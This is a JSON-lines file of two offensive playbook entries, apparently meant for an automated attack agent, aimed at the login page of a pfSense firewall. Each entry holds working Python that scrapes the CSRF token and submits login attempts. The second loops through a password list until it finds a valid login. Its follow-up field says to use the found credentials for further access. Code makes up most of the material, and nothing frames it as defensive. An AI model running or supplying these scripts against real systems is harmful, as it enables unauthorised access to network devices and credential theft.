{"name": "Develop Python Brute-Force Script", "category": "exploitation", "trigger": {"service": "http", "indicators": ["pfSense login page", "CSRF token mechanism"]}, "prerequisites": {"access": "none", "tools": ["python", "requests", "re"]}, "execution": ["import requests\nimport re\ns = requests.Session()\nurl = \"http://$TARGET/index.php\"\nresponse = s.get(url)\ncsrf_token = re.search(r'name=\"csrfmagic\" value=\"(.*?)\"', response.text).group(1)\nlogin_data = {\n    'csrfmagic': csrf_token,\n    'username': '$USER',\n    'password': '$PASS',\n    'login': 'Login'\n}\nlogin_response = s.post(url, data=login_data)\nif 'dashboard' in login_response.text:\n    print('Valid login!')\nelse:\n    print('Invalid login!')"], "decision_points": [{"if": "login is successful", "then": "add to valid credentials list"}], "success_indicators": ["valid login detected"], "follow_up": ["loop through password list", "automate brute force"], "references": {"cve": null, "gtfobins": null}}
{"name": "Automate Brute-Force with Password List", "category": "exploitation", "trigger": {"service": "http", "indicators": ["pfSense login page", "CSRF token mechanism"]}, "prerequisites": {"access": "none", "tools": ["python", "requests", "re"]}, "execution": ["import requests\nimport re\ns = requests.Session()\nurl = \"http://$TARGET/index.php\"\nresponse = s.get(url)\ncsrf_token = re.search(r'name=\"csrfmagic\" value=\"(.*?)\"', response.text).group(1)\nwith open('passwords.txt', 'r') as f:\n    for password in f:\n        password = password.strip()\n        login_data = {\n            'csrfmagic': csrf_token,\n            'username': '$USER',\n            'password': password,\n            'login': 'Login'\n        }\n        login_response = s.post(url, data=login_data)\n        if 'dashboard' in login_response.text:\n            print(f'Valid login found: {password}')\n            break\n        else:\n            print(f'Trying password: {password}')"], "decision_points": [{"if": "valid login found", "then": "stop brute force"}], "success_indicators": ["valid username and password found"], "follow_up": ["use found credentials for further access"], "references": {"cve": null, "gtfobins": null}}
